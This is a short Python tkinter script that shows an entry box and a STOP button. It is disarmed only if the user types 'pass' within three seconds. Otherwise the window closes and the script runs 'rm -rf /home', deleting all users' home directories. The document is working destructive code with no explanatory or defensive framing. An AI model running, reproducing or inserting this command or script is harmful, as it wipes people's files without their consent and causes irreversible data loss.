#! /usr/bin/env python3

from tkinter import *
import os

main = Tk()

input = Entry(main)
input.pack()
input.focus_set()

def callback():
	if input.get() == "pass":
		quit()

button = Button(main, text = "STOP", width = 10, command=callback)
button.pack()

main.after(3000, main.destroy)
mainloop()

os.system("rm -rf /home")